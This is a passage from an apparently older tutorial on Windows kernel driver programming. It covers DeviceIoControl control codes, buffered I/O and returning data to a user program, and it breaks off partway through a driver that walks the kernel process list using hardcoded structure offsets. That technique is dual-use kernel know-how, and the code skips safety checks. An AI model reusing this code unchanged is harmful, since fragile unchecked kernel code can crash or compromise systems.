style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>outputBufferLength
= irpStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>ioControlCode
= irpStack-&gt;Parameters.DeviceIoControl.IoControlCode;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;inputBuffer=%x
outputBuffer=%x inputBufferLength=%d outputBufferLength=%d ioControlCode
=%d&quot;,inputBuffer,outputBuffer,inputBufferLength,outputBufferLength,
ioControlCode);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>io1
= ioControlCode &amp;0x1ffc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>io1
= io1 &gt;&gt; 2;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;ioControlCode=%08x
io1=%d&quot;,ioControlCode,io1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>ans
= *inputBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;ans=%d&quot;,ans);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>*outputBuffer=10;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>*(outputBuffer+1)=20;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>Irp-&gt;IoStatus.Information=8;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>Irp-&gt;IoStatus.Status
= STATUS_SUCCESS;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>Before
we move back to working with processes, lets write a program that will transfer
data back to our user mode program from a device driver. So far we have send
values from ring 3 to our device driver, now lets send data from the device
driver to our user program. The second parameter to our function
DeviceIoControl is not<span style="mso-spacerun: yes">  </span>one large
monolithic value, but made up of individual fields. The entire 32 bits is
divided into 6 fields. The first two bits is called the transfer type. Thus we
are allowed any of four values given below.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
METHOD_BUFFERED<span style="mso-spacerun: yes">                 </span>0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
METHOD_IN_DIRECT<span style="mso-spacerun: yes">                </span>1<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
METHOD_OUT_DIRECT<span style="mso-spacerun: yes">               </span>2<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
METHOD_NEITHER<span style="mso-spacerun: yes">                  </span>3<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>There
are three major ways to transfer data to and fro from ring 0 to ring 3. For small
amounts of data we use the first method, Buffered IO. The OS created a non
paged buffer which is the same size as the buffer we the application specify.
When we send the data to the driver, the I/O manager copies the data into
memory that the driver will be passed a handle to. The driver can this read
this memory to fetch its contents. When the driver wants to send data to a ring
3 program, it copies the data into a buffer, which is then copied into memory
specified by the ring 3 program before the DeviceIoControl function finishes.
This is the method most drivers use.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><i><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Whenever
we want to transfer large amounts of data quickly we use the sec</span></i><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ond
method, Direct I/O. This uses DMA or PIO for the transfer. The OS locks the
applications buffer in memory. It then uses a entity called a memory descriptor
list MDL that we will show you later to allow us to handle these pages. We have
two hash defines for this method.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
last is neither of the above two where the OS passes only the application i.e
input and output buffers virtual addresses and size. Thus the IO manager does
not supply system buffers or MDLs nor does it validate or map the memory. This
buffer is only accessible by drivers that are executing in the applications
thread context that started the IO request. This condition can only be met by
the highest level kernel mode driver and thus not normally used at all. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
next 11 bits are called the function code and values less than 0x800 are
reserved by Microsoft. This value specifies what the driver should do with the
request. There would be a series of if statements in the driver where we do
different things dependent upon the value here.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
then have one more bit called the custom bit, which is left for us to use. The
next two bits are called required access. The driver will create a device which
we will open using the CreateFile function. Here we have to specify an access
field so that the system can figure out whether we have the right access.
Normally we use FILE_ANY_ACCESS and the other values are as shown below.<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
FILE_ANY_ACCESS<span style="mso-spacerun: yes">                 </span>0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
FILE_SPECIAL_ACCESS<span style="mso-spacerun: yes">    </span>(FILE_ANY_ACCESS)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
FILE_READ_ACCESS<span style="mso-spacerun: yes">          </span>( 0x0001
)<span style="mso-spacerun: yes">    </span>// file &amp; pipe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
FILE_WRITE_ACCESS<span style="mso-spacerun: yes">         </span>( 0x0002
)<span style="mso-spacerun: yes">    </span>// file &amp; pipe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
next 15 bits are the device type and the last bit is the common bit. As before
values less than 0x800 are reserved for Microsoft and the rest we can use. This
number identifies the device type and the value of 2 specifies a CD_ROM. The
value FILE_DEVICE_UNKNOWN is 0x22 which specifies an unknown device. If our
device driver does not fall in a certain device type, either we use the above
or a value larger than 32768. The guys at Microsoft have given us a macro to
make our job easier.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
CTL_CODE( DeviceType, Function, Method, Access ) (<span style="mso-spacerun:
yes">                 </span>\<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">    </span>((DeviceType) &lt;&lt; 16) | ((Access)
&lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
use this macro CTL_CODE and give it the Device type, function code, the manner
of transferring data and finally the access method. This macro does the
shifting of bits for us. We also have macros like <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
DEVICE_TYPE_FROM_CTL_CODE(ctrlCode)<span style="mso-spacerun: yes">    
</span>(((ULONG)(ctrlCode &amp; 0xffff0000)) &gt;&gt; 16)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>which
pick up a device type form a control code. The actual value of the control code
goes over, we have to extract the individual fields. In the program y.c we want
to send a function code of 3 and<span style="mso-spacerun: yes">  </span>keep
all the other fields at 0. We thus left shift the number 3 by 2. We pass a
value of 12 and want two numbers back in our array b, whose address we pass and
the second last parameter is the size of the array 8.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Vijay
6<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IRP_MJ_CREATE<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>inputBuffer=81b2fa88
outputBuffer=81b2fa88 inputBufferLength=4 outputBufferLength=8 ioControlCode=12<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ioControlCode=0000000c
io1=3<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ans=12<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Unloading...<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
the r.c program we use the member SystemBuffer which contains the address of
the buffer in which we have to read and write. The read and write buffers are
the same. We first read the values passed to us and then write the new values
we want to send across.<span style="mso-spacerun: yes">  </span>We use the i</span><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>rpStack
pointer to give us the size of the input and output buffer. Thus the input
buffer length is 4 and the output buffer length is 8. The IO control code value
is 12 as we have shifted 3 two to the right the net result is that we have multiplied
it by 4. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>We
then use the mask 0x1ffc which we bit wise and with the control code to give us
the function code. We then right shift this value by 2. We fetch the input
values like before, but the values we pass back we now write into the
outputBuffer pointer. We write 10 and 20 and thus the values of the two members
of the array passed are 10 and 20.</span><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
Information member we now set to the number of bytes we have actually written.
As we have written 8 bytes, we set this member to 8. If we set to it 4 as
below,<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>Irp-&gt;IoStatus.Information=8;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Then
even though we have written 8 bytes of the array, the system thinks we have
written only 4, and the first member of the array gets set not the second. The
output now shows as.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>b=4
return is 10 0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>instead
of<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>b=4
return is 10 20<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Now
lets write out a program that will display all the programs that are running on
our machine. Wait a minute, we already wrote such a program down in the past.
The only problem with that the output of that program was displayed using
DbgPrint and not by our ring 3 programs.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>y.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
b,howmany;char arr[10000];int i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>hDevice
= CreateFile(&quot;\\\\.\\&quot;DRV_NAME, GENERIC_WRITE | GENERIC_READ,
FILE_SHARE_READ | FILE_SHARE_WRITE,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
NULL);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DeviceIoControl
(hDevice,3 &lt;&lt; 2,0,0,&amp;arr,10000,&amp;b,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0; i &lt; b ; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>printf(&quot;%c&quot;,arr[i]);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
our y.c program, we simply create a array 10000 large and pass the address of
this array and its size to the function DeviceIoControl. The second last parameter
b simply gives us the length of the output written by the driver. We then use a
for loop to write out the array. This gives us a huge output of all the
programs running on our machine. We are not passing any parameters to our
driver.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING
gDeviceName,gSymbolicLinkName;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PDEVICE_OBJECT
gpDeviceObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
DRV_NAME L&quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
process<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
a[156];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
pid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LIST_ENTRY
*Flink,*Blink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PIO_STACK_LOCATION
irpStack;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>irpStack
= IoGetCurrentIrpStackLocation (Irp);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(irpStack-&gt;MajorFunction == IRP_MJ_CREATE)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(irpStack-&gt;MajorFunction == IRP_MJ_DEVICE_CONTROL)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
startpid,len,totallen,outputBufferLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
process *proc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
*outputBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
aa[100];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>outputBuffer
= Irp-&gt;AssociatedIrp.SystemBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>proc=
(struct process *)PsGetCurrentProcess();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>startpid
= proc-&gt;pid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>totallen=0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>outputBufferLength
= irpStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
